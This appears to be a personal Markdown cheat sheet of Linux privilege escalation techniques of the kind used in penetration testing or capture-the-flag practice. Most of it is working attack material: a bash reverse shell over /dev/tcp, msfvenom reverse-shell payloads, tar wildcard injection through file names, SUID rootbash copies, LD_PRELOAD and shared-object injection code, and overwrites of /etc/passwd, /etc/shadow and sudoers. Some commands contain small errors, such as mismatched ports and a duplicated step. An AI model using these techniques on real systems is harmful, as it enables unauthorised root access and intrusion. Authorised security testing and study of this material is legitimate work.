# Privilege Escalation

### Scripts : 

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
- 

### Send the script to the target machine :
```bash
python3 -m http.server 8000 		  # Open a local web server
ngrok http 8000						  # Forward the port using nkrok
wget https://ngrok.io:port/linEnum.sh # Download the file
```

## Enumeration

### System informations
```bash
hostname
uname -a            # useful when searching for kernel vulnerabilities
cat /proc/version   # Provides information about the target system processes
cat /etc/issue      # Some information about the operating system
ps                  # Enumerate processus
ps -A
ps axfj
netstat             # Enumerate open ports
netstat -ltp        # Enumerate listening tcp ports and gives PID
netstat -ano
ss -tunlp
```


### Abusing SUIDs 
##### Enumerate SUIDs
```bash
find / -perm -u=s -type f 2>/dev/null
```
or
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
then search suspect SUID in https://gtfobins.github.io

### Known exploits 
Take a look at https://exploit-db.com or https://google.com ...

### Abusing shell features #1

***context :***
The executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
```bash
/bin/bash --version 
```
- This works only if the version is under 4.2-048
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

### Abusing shell features #2
- Will not work on bash version 4.4 and above  
- Vulnerable when debugging bash is enabled  
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env
/tmp/rootbash -p
```


### Writable /etc/passwd
If `/etc/passwd` is writable then you can add a user with root permissions
- Create a new password hash : 
```bash
openssl passwd -1 -salt [salt] [password]
```
or
```bash
openssl passwd [newpassword]
```

***Add the new line :***  
```test:x:0:0:root:/root:/bin/bash```  

***Username:*** It is used when user logs in. It should be between 1 and 32 characters in length. 
***Password:*** An x character indicates that encrypted password is stored in /etc/shadow file. sha512  otherwise, contains the cleatext password.
***User ID (UID):*** Each user must be assigned a user ID (UID).   
***UID 0*:** = root   
***UIDs 1-99:*** other predefined accounts.  
***UID 100-999:*** are reserved by system for administrative and system accounts/groups.  
***UID 1000+:*** users  
***Group ID (GID):*** The primary group ID (stored in /etc/group file)  
***User ID Info:*** extra information about the users.  
***Home directory:*** The absolute path to the directory the user will be in when they log in  
***Command/shell:*** The absolute path of a command or shell (/bin/bash). 

### Readable /etc/shadow :
Crack the hash with [[Hashcat]]: it's supposed to be **sha-512crypt**
### Writable /etc/shadow :

Create a new password : 
```bash
mkpasswd -m sha-512 newpasswordhere
```
Add/Update the new line
```
root:HASH_HERE:19396:0:99999:7:::
```

### Shell escape
***This may needs user credentials***  
List autorisations
```bash
sudo -l  
```
 If one is here, take a look at https://gtfobins.github.io
### RBash escape
View allowed command
```bash
compgen -c
```
Escape using `vi`
```bash
vi
:set shell=/bin/sh
:shell
```
or just try to open a new shell with one of those
```bash
bash 
zsh
csh 
sh 
```
***In RBASH, some tools may be allowed and they can be useful***

### Exploiting cron jobs :
Look at active cron jobs 
```bash
cat /etc/crontab
```
We are looking for a file that is running as another user to escalate privileges
If so, put a reverse shell or update `/etc/sudoers`


***Format =# = ID***  
***m*** = Minute  
***h*** = Hour  
***dom*** = Day of the month  
***mon*** = Month  
***dow*** = Day of the week  
***user*** = What user the command will run as  
***command*** = What command should be run  
For Example :    
```
-  m   h dom mon dow user  command  
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```
### Writable Cron Jobs 
### Example 
##### Reverse shell
We edit the executed file `/tmp/rootbash` or we update `/etc/crontab`
```bash
#!/bin/bash
bash -i >& /dev/tcp/[Adresse IP]/4444 0>&1
```

```bash
nc -lvnp 4444
```

##### Rootbash
- Locate PATH  
- Create an imitating file with :
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
```
Make it executable
```bash
chmod +xs /tmp/rootbash
chmod +x /path/filename.sh
```
Wait for the cron job executing
```bash
/tmp/rootbash -p
```
##### Overwriting crons
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
Wait till it executes `/tmp/bash -p`

### TAR command
This can happened when a cron is running `tar -some-tags *`  (directly or indirectly)
**Please denote the star**
In this case, file names are understood as real `tar` tags

***Note that backup script are often scheduled in crontab***

Let's create a reverse shell
1. We create the executable file

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.14.34 LPORT=444 -f elf -o shell.elf
chmod +x /tmp/shell.elf
```

2. Let's create `tar` tags

```bash
touch /tmp/--checkpoint=1
touch /tmp/--checkpoint-action=exec=shell.elf
```

3. We listen
```bash
nc -nvlp 4444
```
### Other privesc example (sudo)
```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "foo"  > "--checkpoint-action=exec=sh privesc.sh"
echo "foo"  > --checkpoint=1
```
### Other privesc example (rootbash)
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

Wait until the cron executes
```bash
/tmp/bash -p
```

### Exploiting path variable
We take a look at executable files, if some files are run as a better user and some other files are run within the file, we can create a new file, with the same name as the second file and edit `$PATH` variable

```bash
echo $PATH
```

```bash
cd /tmp
echo "[whatever command we want to run]" > "name of the executable we're imitating"
```

```bash
echo "/bin/bash" > /tmp/filename
chmod +x /etc/filename	    # Make the file executable
export PATH=/tmp:$PATH  # Export the path
```

The file needs to be reexecuted
### History speeks too loud

Check in the  `history` file
```bash
cat ~/.history | less
```

### Configuration files
- They can contain directly a password
- They can link to a file that contains a password

### SSH private key
Suppose that you found the `id_rsa` private key from a remote user
You can connect as the user within the server by passing the private key
**Note :** Some keys are password protected, take a look at [[Hashcat]]
```bash
chmod 600 id_rsa
ssh -i id_rsa username@ipaddress
```

### NFS root_squashing
- This exploit relies on `nfs` misconfigurations

```bash
cat /etc/exports # We found no_root_squash
```
**Mount the nfs directory to our local machine :** 
```bash
sudo su
mkdir /tmp/nfs
mount -o rw,vers=2 -v -t nfs <targetIP>:/<targetpath> /tmp/nfs
```
**Generate the payload**
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +x /tmp/nfs/shell.elf
```
**On the target**
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

### LD_Preload : 
If the target is vulnerable to LD_Preload, it means that when typing `sudo -l` the machine responds with `env_keep+=LD_PRELOAD` in the stuff
```bash
sudo -l
...
    env_keep+=LD_PRELOAD
```

1. Open a text editor and type:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
2. Save the file as `x.c`
3. In command prompt type:
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

### SUID/SGID share object injection
We look are missing SUID's to recreate them

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

From the output, notice that a .so file is missing from a writable directory.
***.so is compiled .c***
##### Output example : 
```
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

So, let's fake the binary
```bash
nano /home/user/.config/libcalc.c  
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile and run
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

### SUID Symlink

```bash
dpkg -l | grep nginx
```

From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3  
For this exploit, it is required that the user be `www-data`

Run
```bash
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log  
```

At this stage, the system waits for logrotate to execute (THIS CAN BE LONG)  

### SUID/SGID environnement variable
```bash
sudo -l / output suid-env
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

```bash
sudo -l / output suid-env2
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### Kernel exploit :
1. Run the linux `exploit-suggester.pl `
```bash  
perl PATH/SCRIPT.PL  
```

2. Use the desired vulnerability : here **dirty cow**  

**compile** 
```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```
**run** 
```bash
./c0w	
/usr/bin/passwd	-> allow to gain te root shell
```
### Capabilities

```bash
getcap -r / 2>/dev/null
```

From the output, notice the value of the `cap_setuid` capability.
#### Example : 

/usr/bin/python2.6 = cap_setuid+ep

```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Docker escape
To check if you're in a docker, type `hostame`.  
If the response is weird stuff, you are probably in.  

- One method is to check for backup files that are run as original root  
It will require to have privileges to write on vulnerable files  
Spawn a regular bash reverse shell


## Take a look at those links

- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
- https://payatu.com/guide-linux-privilege-escalation


